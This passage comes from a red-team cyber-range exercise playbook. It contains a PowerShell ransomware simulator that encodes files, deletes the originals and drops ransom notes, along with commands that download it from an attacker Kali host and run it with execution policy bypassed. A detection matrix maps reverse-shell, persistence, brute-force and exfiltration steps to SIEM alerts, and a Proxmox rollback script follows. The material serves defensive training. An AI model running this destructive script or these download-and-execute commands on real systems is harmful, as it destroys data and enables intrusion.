    "SIMULATED EXERCISE DOCUMENT $_ - CONFIDENTIAL OPERATIONAL DATA" | Out-File -FilePath $filePath -Encoding utf8
}
Get-ChildItem -Path $CanaryDir
```

#### Step 5.2: Host and Download Ransomware Simulator Script

Save the benign simulator on Kali (`/opt/cydex/payloads/Invoke-GhostfireSimulator.ps1`):

```powershell
# Save to /opt/cydex/payloads/Invoke-GhostfireSimulator.ps1
<#
.SYNOPSIS
    APT GHOSTFIRE Controlled Ransomware Simulator (AJEX Exercise Only)
.DESCRIPTION
    Encodes files with Base64, appends .ghostfire extension, drops ransom note.
#>
param (
    [string]$TargetDirectory = "C:\ExerciseShares"
)

Write-Host "[!] INITIATING APT GHOSTFIRE CONTROLLED SIMULATOR..." -ForegroundColor Red

# 1. Target canary files
$files = Get-ChildItem -Path $TargetDirectory -Include *.docx,*.xlsx,*.pdf,*.txt -File -Recurse

foreach ($file in $files) {
    Write-Host "[*] Simulating encryption on: $($file.FullName)"
    $bytes = [System.IO.File]::ReadAllBytes($file.FullName)
    $encoded = [System.Convert]::ToBase64String($bytes)
    
    # Write encoded payload to .ghostfire file
    $newPath = "$($file.FullName).ghostfire"
    [System.IO.File]::WriteAllText($newPath, "--- APT GHOSTFIRE ENCRYPTED ARTIFACT ---`n$encoded")
    
    # Remove original file to simulate destructive ransomware behavior
    Remove-Item -Path $file.FullName -Force
}

# 2. Drop Simulated Ransom Note
$RansomNote = @"
===============================================================================
                       APT GHOSTFIRE EXERCISE RANSOM NOTE
===============================================================================
ATTENTION AFP CYCOM COMMAND:
All critical operational files in this enclave have been encrypted using 
military-grade cryptographic algorithms.

To restore your systems and decrypt your data:
1. Contact APT GHOSTFIRE via Transit Node: 10.100.0.80 (Port 4433)
2. Submit your unique victim token: CYCOM-BT1-NODE1-2026
3. Do not alter or rename .ghostfire files or recovery will be impossible.

THIS IS A CONTROLLED CYBER RANGE EXERCISE SIMULATION.
DO NOT CONTACT EXTERNAL AUTHORITIES.
===============================================================================
"@

Set-Content -Path "$TargetDirectory\GHOSTFIRE_README.txt" -Value $RansomNote -Force
Set-Content -Path "C:\Users\Public\Desktop\GHOSTFIRE_README.txt" -Value $RansomNote -Force -ErrorAction SilentlyContinue

Write-Host "[+] Controlled Ransomware Simulation Complete." -ForegroundColor Green
```

#### Step 5.3: Execute Ransomware Simulator on `BT1-CYCOM-FileSvr`

From the SSH session on `BT1-CYCOM-FileSvr`:

```powershell
# Download simulator from Kali HTTP server
Invoke-WebRequest -Uri "http://10.100.0.80:8000/Invoke-GhostfireSimulator.ps1" -OutFile "$env:TEMP\Invoke-GhostfireSimulator.ps1"

# Execute simulator against the canary directory
powershell.exe -ExecutionPolicy Bypass -File "$env:TEMP\Invoke-GhostfireSimulator.ps1" -TargetDirectory "C:\ExerciseShares"

# Verify file modifications and dropped ransom notes
Get-ChildItem -Path "C:\ExerciseShares"
type "C:\ExerciseShares\GHOSTFIRE_README.txt"
```

---

## SECTION 4: Detection & Alert Validation Matrix

This matrix establishes direct detection-engineering correlation between the Red Team commands executed and the corresponding Sysmon, Windows Event Logs, and Wazuh SIEM alerts displayed on `BT6-DND-Wazuh` (`10.6.0.10`).

| Scenario Phase | Red Team Command / Artifact | Event Source | Event ID / Log Channel | Expected Wazuh Rule ID | Wazuh Alert Description / SOC Finding |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **Phase 1: Initial Access** | Download `Annual_Joint_Exe.pdf.ps1` via `Invoke-WebRequest` | Sysmon / PowerShell | Sysmon EID 1<br>PS EID 4104 | `92650`<br>`92651` | PowerShell downloading remote executable/script from transit IP `10.100.0.80`. |
| **Phase 1: Masquerading** | Drop `C:\Program Files (x64)\Microsoft\OneDrive.exe` | Sysmon | Sysmon EID 11 (FileCreate) | `100010` *(Custom)*<br>`60106` | File created in protected `Program Files` path by anomalous parent process. |
| **Phase 1: Persistence** | `Register-ScheduledTask -TaskName "MicrosoftOneDriveUpdate"` | Windows Security / TaskScheduler | Security EID 4698<br>Sysmon EID 1 | `60115`<br>`92200` | New scheduled task created: `MicrosoftOneDriveUpdate` pointing to non-standard executable. |
| **Phase 1: C2 Outbound** | `OneDrive.exe` connects to `10.100.0.80:4433` | Sysmon / pfSense Firewall | Sysmon EID 3 (NetworkConnect)<br>pfSense Filter Log | `100015`<br>`87701` | Outbound TCP connection to non-standard port `4433` initiated by `OneDrive.exe`. |
| **Phase 2: Local Recon** | `whoami /all`, `net user /domain`, `net group` | Security / Sysmon | Security EID 4688<br>Sysmon EID 1 | `60104`<br>`92001` | User discovery and domain group enumeration commands executed via command line. |
| **Phase 2: File Recon** | Discovery and reading of `List of Users.txt` | Security / PowerShell | PS EID 4104<br>Sysmon EID 1 | `92652` | Access to sensitive credential reference file (`List of Users.txt`). |
| **Phase 2: Subnet Ping** | `Test-Connection` sweep across `10.1.0.0/24` | pfSense / Sysmon | Sysmon EID 3<br>pfSense ICMP State | `87702` | Rapid sequential ICMP echo requests from workstation to entire subnet. |
| **Phase 2: Port Scanning** | TCP port probe to `10.1.0.3` on ports 22, 5985, 445 | pfSense / Security | pfSense TCP SYN Flags<br>Security EID 5156 | `87703`<br>`100020` | Port scan detected originating from internal workstation `10.1.0.4`. |
| **Phase 3: Brute-Force** | Hydra / automated SSH attempts to `10.1.0.3` | OpenSSH / Security | Security EID 4625<br>OpenSSH EID 4 | `5710`<br>`5712` | Multiple SSH authentication failures for user `sshuser` from single IP within short window. |
| **Phase 3: Lateral Access** | Successful SSH login for `sshuser@10.1.0.3` | OpenSSH / Security | Security EID 4624 (Logon Type 10/4)<br>OpenSSH EID 1 | `5715`<br>`60107` | Successful SSH authentication following failed login attempts (Brute-force success). |
| **Phase 4: Data Discovery** | `Get-ChildItem -Filter "*Top_Secret*"` | PowerShell / Sysmon | PS EID 4104<br>Sysmon EID 1 | `92653` | Enumeration of classified file pattern (`Top_Secret.pdf`) in shared directories. |
| **Phase 4: Exfiltration** | POST to `http://10.100.0.80:8000/upload` | Sysmon / pfSense | Sysmon EID 3<br>pfSense TCP Outbound | `100030`<br>`87704` | Large outbound HTTP POST transfer to external transit IP `10.100.0.80` on port `8000`. |
| **Phase 5: Ransomware** | Execution of `Invoke-GhostfireSimulator.ps1` | Sysmon / PowerShell | PS EID 4104<br>Sysmon EID 1 | `92655` | Suspicious mass file rename / extension change to `.ghostfire` detected in real-time. |
| **Phase 5: Ransom Note** | Creation of `GHOSTFIRE_README.txt` | Sysmon / Wazuh FIM | Sysmon EID 11<br>Wazuh `syscheck` | `100040`<br>`550` | File Integrity Monitoring (FIM): Known ransomware note filename pattern created on disk. |

---

## SECTION 5: Automated Proxmox Lifecycle & Snapshot Runbook

To maintain cyber range hygiene, auditability, and immediate repeatability, the bash script below runs directly on Proxmox `node1` (via SSH or Proxmox Shell). It manages baseline creation, post-scenario state auditing, and 60-second atomic rollbacks for all exercise VMIDs:
* `170` : `RedTeam0` (Kali)
* `135` : `BT1-CYCOM-PFSENSE`
* `175` : `BT1-CYCOM-DC`
* `153` : `BT1-CYCOM-FileSvr`
* `151` : `BT1-CYCOM-WS1`

### 5.1 Master Proxmox Automation Script (`/root/cydex_lifecycle.sh`)

Save the following script as `/root/cydex_lifecycle.sh` on Proxmox `node1`:

```bash
#!/bin/bash
# ==============================================================================
# CYDEX EXERCISE LIFECYCLE CONTROLLER: AJEX RT-PLAYBOOK-001
# Target Cluster: Node 1 (10.2.229.9)
# Managed VMIDs: 170 (Kali), 135 (pfSense), 175 (DC), 153 (FileSvr), 151 (WS1)
# ==============================================================================

set -eo pipefail

SNAPSHOT_TAG="RT-BASE-CLEAN"
VM_LIST=(170 135 175 153 151)
TIMEOUT_SECS=60

function print_header() {
    echo -e "\n===================================================================="
    echo -e " [CYDEX] $1"
    echo -e "===================================================================="
}

function verify_vms_exist() {
    for vmid in "${VM_LIST[@]}"; do
        if ! qm status "$vmid" &>/dev/null; then
            echo "[-] Error: VMID $vmid does not exist on this Proxmox node!"
            exit 1
        fi
    done
}

function create_baseline() {
    print_header "CREATING ATOMIC BASELINE SNAPSHOTS [$SNAPSHOT_TAG]"
    verify_vms_exist
    
    for vmid in "${VM_LIST[@]}"; do
        VM_NAME=$(qm config "$vmid" | grep -m1 '^name:' | awk '{print $2}')
        echo "[*] Processing VMID $vmid ($VM_NAME)..."
        
        # Check if snapshot already exists
        if qm listsnapshot "$vmid" | grep -qw "$SNAPSHOT_TAG"; then
            echo "    [!] Snapshot $SNAPSHOT_TAG already exists on $vmid. Deleting old baseline..."
            qm delsnapshot "$vmid" "$SNAPSHOT_TAG"
        fi
        
        echo "    [+] Taking live snapshot: $SNAPSHOT_TAG (with RAM state)..."
        qm snapshot "$vmid" "$SNAPSHOT_TAG" --vmstate 1 --description "AJEX Clean Pre-Exercise Baseline"
    done
    echo "[✓] All target VMs cleanly snapshotted under tag '$SNAPSHOT_TAG'."
}

function rollback_exercise() {
    print_header "RAPID ROLLBACK: RESTORING TO CLEAN BASELINE [<60s]"
    verify_vms_exist
    
    START_TIME=$(date +%s)
    PIDS=()
    
    for vmid in "${VM_LIST[@]}"; do
        (
            echo "[*] Initiating parallel rollback for VMID $vmid to $SNAPSHOT_TAG..."
            qm rollback "$vmid" "$SNAPSHOT_TAG" --start 1
            echo "[✓] VMID $vmid rollback and power-up complete."
        ) &
        PIDS+=($!)
    done
    
    # Wait for all background rollbacks to complete
    for pid in "${PIDS[@]}"; do
        wait "$pid"
    done
    
    END_TIME=$(date +%s)
    ELAPSED=$((END_TIME - START_TIME))
    
    echo -e "\n[✓] Exercise Enclave Reverted in $ELAPSED seconds (Limit: ${TIMEOUT_SECS}s)."
    audit_status
}

function audit_status() {
    print_header "ENCLAVE HEALTH & TELEMETRY AUDIT"
    printf "%-8s %-22s %-12s %-18s\n" "VMID" "HOSTNAME" "STATUS" "SNAPSHOT CONFIRMED"
    printf "%-8s %-22s %-12s %-18s\n" "----" "--------" "------" "------------------"
    
    for vmid in "${VM_LIST[@]}"; do
        VM_NAME=$(qm config "$vmid" | grep -m1 '^name:' | awk '{print $2}')
        STATUS=$(qm status "$vmid" | awk '{print $2}')
        HAS_SNAP="NO"
        if qm listsnapshot "$vmid" | grep -qw "$SNAPSHOT_TAG"; then
            HAS_SNAP="YES"
        fi
        printf "%-8s %-22s %-12s %-18s\n" "$vmid" "$VM_NAME" "$STATUS" "$HAS_SNAP"
    done
}

case "$1" in
    baseline)
        create_baseline
        ;;
    rollback)
        rollback_exercise
        ;;
    audit)
        audit_status
        ;;
    *)
        echo "Usage: $0 {baseline|rollback|audit}"
        echo "  baseline : Create the pristine 'RT-BASE-CLEAN' snapshot across all target VMs."
        echo "  rollback : Instantly revert all target VMs to clean state in parallel (<60s)."
        echo "  audit    : Audit the current VM power state and snapshot status."
        exit 1
        ;;
esac
```

### 5.2 Operator Command Reference

Make the script executable and execute the commands on Proxmox `node1`:

```bash
chmod +x /root/cydex_lifecycle.sh

# 1. Take clean baseline prior to starting Scenario 1
/root/cydex_lifecycle.sh baseline

# 2. Audit current state and snapshot presence
/root/cydex_lifecycle.sh audit

# 3. Post-exercise instant teardown and rollback (reverts attack in ~45 seconds)
/root/cydex_lifecycle.sh rollback
```

---

## SECTION 6: Red Team Operator Debrief & Verification Checklist

Before reporting completion to the exercise director or White Cell, verify that all attack milestones and detection triggers have concluded cleanly:

* [ ] **Initial Access**: Reverse shell on TCP 4433 terminated cleanly with no lingering hung processes.
* [ ] **Persistence**: Scheduled task `MicrosoftOneDriveUpdate` verified and subsequently cleared upon Proxmox rollback.
* [ ] **Credential Attack**: Hydra and SSH brute-force traffic logs confirmed in pfSense state tables and Wazuh manager index (`rule.id: 5710`).
* [ ] **Exfiltration**: Hash of `Top_Secret_Package.zip` received on Kali matches staged file hash exactly.
* [ ] **Ransomware Simulator**: Canary directory `C:\ExerciseShares` encrypted with `.ghostfire` and `GHOSTFIRE_README.txt` dropped; verified no production OS directories impacted.
* [ ] **Cluster Teardown**: `qm rollback` executed successfully within the 60-second limit; all VMs verified active and functional.
